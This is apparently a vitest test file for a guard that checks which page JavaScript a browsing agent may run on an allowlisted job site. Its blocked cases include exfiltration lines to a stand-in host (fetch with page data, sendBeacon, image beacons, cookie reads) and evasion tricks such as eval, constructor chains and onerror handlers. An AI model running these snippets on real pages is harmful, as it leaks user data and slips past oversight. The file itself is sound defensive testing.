import { describe, expect, it } from "vitest";
import { normalizeAllowlist } from "./allowlist.js";
import { checkPageJavascript } from "./javascript.js";

const ALLOW = normalizeAllowlist(["topcv.vn"]);

describe("checkPageJavascript: code that only reads or stays on the allowed site", () => {
  const allowed = [
    "document.body.innerText",
    "[...document.querySelectorAll('a')].map(a => ({ t: a.textContent, href: a.href }))",
    "window.location.href",
    "location.href.includes('topcv')",
    "const u = new URL(location.href); u.searchParams.get('id')",
    "window.scrollTo(0, document.body.scrollHeight)",
    "await new Promise(r => setTimeout(r, 1000)); document.title",
    "setTimeout(() => document.querySelector('.more')?.click(), 100)",
    "document.querySelector('button.more').click()",
    "fetch('/api/jobs?page=2').then(r => r.json())",
    "await fetch('https://www.topcv.vn/api/x')",
    "const n = 2; await fetch(`/api/jobs?page=${n}`)",
    "location.hash = '#reviews'",
    "location.search = '?page=2'",
    "location.href = 'https://www.topcv.vn/viec-lam'",
    "location.assign('/viec-lam?page=3')",
    "history.back()",
    "history.pushState({}, '', '/jobs?page=2')",
    "location.reload()",
    "JSON.parse(document.getElementById('__NEXT_DATA__').textContent)",
    "Array.from(document.links, a => a.href).filter(h => h.startsWith('https://www.linkedin.com/'))",
    "document.querySelector('.jd').innerHTML",
    "const el = document.querySelector('.jd'); el.innerHTML.length",
    "a.href = '/viec-lam/123'",
    "const o = { href: 'https://evil.example/' }; o",
    "return document.title",
    "const data = { eval: 1 }; data.eval",
    "if (location.href === 'https://evil.example/') { 1 }",
    "document.querySelector('#x').innerHTML = ''",
    "const x = new XMLHttpRequest(); x.open('GET', '/api/x'); x.send()",
    "window.open('/viec-lam/1')",
    // Object.prototype names are not window properties.
    "const c = obj.valueOf; c.name",
    "toString(); valueOf; hasOwnProperty('x'); window.isPrototypeOf; document.__proto__",
    "obj.valueOf.call(null); window.toString.apply(null); hasOwnProperty`x`",
    // Scraped records built in plain objects may use href/location/src as field names.
    "const job = {}; job.location = card.textContent; job.href = a.href; job.src = img.src; job",
    "const rows = []; rows.href = x; rows",
    "document.querySelector('.jd').constructor.name",
    "el.innerHTML = '<b>Senior engineer</b> with <i>one</i> offer'",
    "new WebSocket('wss://www.topcv.vn/socket')",
  ];
  it.each(allowed)("allows: %s", (code) => {
    expect(checkPageJavascript(code, ALLOW)).toEqual({ allow: true });
  });
});

describe("checkPageJavascript: navigation off the allowed sites", () => {
  const blocked: Array<[string, string]> = [
    ["location.href = 'https://evil.example'", "js_host"],
    ["window.location = 'https://evil.example'", "js_host"],
    ["document.location = 'https://evil.example'", "js_host"],
    ["location = 'https://evil.example'", "js_host"],
    ["top.location.href = 'https://evil.example'", "js_host"],
    ["window.top.location.href = 'https://evil.example'", "js_host"],
    ["location.assign('https://evil.example')", "js_host"],
    ["location.replace('//evil.example')", "js_host"],
    ["window.location.replace('https://evil.example')", "js_host"],
    ["location?.assign('https://evil.example')", "js_host"],
    ["location['href'] = 'https://evil.example'", "js_host"],
    ["window['location']['assign']('https://evil.example')", "js_host"],
    ["location.href = 'javascript:alert(1)'", "js_scheme"],
    ["location.href = 'data:text/html,hi'", "js_scheme"],
    ["location.href = url", "js_unverifiable_url"],
    ["location.href = 'https://topcv.vn' + suffix", "js_unverifiable_url"],
    ["location.href += '@evil.example'", "js_location_compound"],
    ["location.host = 'evil.example'", "js_host"],
    ["location.hostname = 'evil.example'", "js_host"],
    ["location.protocol = 'http:'", "js_location_protocol"],
    ["window.open('https://evil.example')", "js_host"],
    ["open('https://evil.example')", "js_host"],
    ["window.open()", "js_open_blank"],
    ["navigation.navigate('https://evil.example')", "js_host"],
    ["history.pushState({}, '', 'https://evil.example/')", "js_host"],
    ["const l = location; l.href = 'https://evil.example'", "js_host"],
    ["const w = window; w.location = 'https://evil.example'", "js_host"],
    ["const { assign } = location; assign('https://evil.example')", "js_host"],
    ["const { location: loc } = window; loc.assign('https://evil.example')", "js_host"],
    ["const go = location.assign.bind(location); go('https://evil.example')", "js_host"],
    ["(0, location.assign)('https://evil.example')", "js_host"],
    ["location.assign.call(location, 'https://evil.example')", "js_host"],
    ["location.assign.apply(location, ['https://evil.example'])", "js_unverifiable_url"],
    ["const base = 'https://evil.example/'; location.href = base + 'x'", "js_host"],
    // A name that is not only ever a literal object is not exempt.
    ["let o = {}; o = window; o.location = 'https://evil.example'", "js_host"],
    ["const o = {}; function f(o) { o.location = 'https://evil.example' } f(window)", "js_host"],
    ["const job = {}; job.meta.href = someUrl", "js_unverifiable_url"],
  ];
  it.each(blocked)("blocks: %s", (code, rule) => {
    const decision = checkPageJavascript(code, ALLOW);
    expect(decision.allow).toBe(false);
    if (!decision.allow) {
      expect(decision.rule).toBe(rule);
      expect(decision.reason).toMatch(/^Blocked by site guard: /);
    }
  });
});

describe("checkPageJavascript: requests and resources off the allowed sites", () => {
  const blocked: Array<[string, string]> = [
    ["fetch('https://evil.example/?d=' + document.title)", "js_host"],
    ["fetch(url)", "js_unverifiable_url"],
    ["fetch(`https://evil.example/${x}`)", "js_host"],
    ["fetch('https://topcv.vn' + '.evil.example/x')", "js_host"],
    ["fetch('https://topcv.vn' + x)", "js_unverifiable_url"],
    ["window.fetch('https://evil.example')", "js_host"],
    ["navigator.sendBeacon('https://evil.example', data)", "js_host"],
    ["new WebSocket('wss://evil.example')", "js_host"],
    ["new EventSource('https://evil.example/s')", "js_host"],
    ["new Worker('https://evil.example/w.js')", "js_host"],
    ["new Request('https://evil.example')", "js_host"],
    ["const x = new XMLHttpRequest(); x.open('POST', 'https://evil.example'); x.send(d)", "js_host"],
    ["import('https://evil.example/m.js')", "js_host"],
    ["new Image().src = 'https://evil.example/p?' + document.title", "js_host"],
    ["img.src = someUrl", "js_unverifiable_url"],
    ["img.setAttribute('src', 'https://evil.example/p')", "js_host"],
    ["a.setAttribute(name, 'x')", "js_dynamic_attribute"],
    ["a.href = 'https://evil.example'; a.click()", "js_host"],
    ["form.action = 'https://evil.example/collect'", "js_host"],
    ["el.style.background = 'url(https://evil.example/x?' + d + ')'", "js_host"],
    ["el.setAttribute('onclick', 'alert(1)')", "js_event_handler"],
  ];
  it.each(blocked)("blocks: %s", (code, rule) => {
    const decision = checkPageJavascript(code, ALLOW);
    expect(decision.allow).toBe(false);
    if (!decision.allow) expect(decision.rule).toBe(rule);
  });
});

describe("checkPageJavascript: code the guard cannot follow, cookies and markup", () => {
  const blocked: Array<[string, string]> = [
    ["document.cookie", "js_cookies"],
    ["const c = document['cookie']", "js_cookies"],
    ["cookieStore.getAll()", "js_cookies"],
    ["document.body.innerHTML = '<img src=\"https://evil.example/x\">'", "js_host"],
    ["document.write('<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">')", "js_meta_refresh"],
    ["el.insertAdjacentHTML('beforeend', html)", "js_dynamic_markup"],
    ["el.outerHTML = markup", "js_dynamic_markup"],
    ["eval('location.href=\"https://evil.example\"')", "js_dynamic_code"],
    ["new Function('return 1')()", "js_dynamic_code"],
    ["Function('return this')()", "js_dynamic_code"],
    ["const e = eval; e('1')", "js_dynamic_code"],
    ["setTimeout('location.href=1', 0)", "js_dynamic_code"],
    ["window[key]('https://evil.example')", "js_dynamic_access"],
    ["self[a][b] = 1", "js_dynamic_access"],
    ["with (location) { href = 'https://evil.example' }", "js_with"],
    ["Object.assign(location, { href: 'https://evil.example' })", "js_reflective_write"],
    ["Reflect.set(location, 'href', 'https://evil.example')", "js_reflective_write"],
    ["Object.defineProperty(window, 'x', {})", "js_reflective_write"],
    ["document.querySelector('form').submit()", "js_form_submit"],
    ["form.requestSubmit()", "js_form_submit"],
    ["document.createElement('script')", "js_create_element"],
    ["document.createElement('iframe')", "js_create_element"],
    ["document.createElement(tag)", "js_create_element"],
    ["window.opener.postMessage(data, '*')", "js_post_message"],
    ["parent.postMessage(document.title, '*')", "js_post_message"],
    ["location.href = ", "js_parse"],
    ["[].constructor.constructor(\"location.href='https://evil.example'\")()", "js_dynamic_code"],
    ["const F = (() => {}).constructor; F('return 1')()", "js_dynamic_code"],
    ["el.innerHTML = '<img src=\"/x.png\" onerror=\"location.href=1\">'", "js_event_handler"],
    ["document.body.insertAdjacentHTML('beforeend', '<svg onload=alert(1)>')", "js_event_handler"],
  ];
  it.each(blocked)("blocks: %s", (code, rule) => {
    const decision = checkPageJavascript(code, ALLOW);
    expect(decision.allow).toBe(false);
    if (!decision.allow) expect(decision.rule).toBe(rule);
  });

  it("blocks code that is not a string", () => {
    expect(checkPageJavascript(undefined, ALLOW)).toMatchObject({ allow: false, rule: "js_parse" });
  });
});
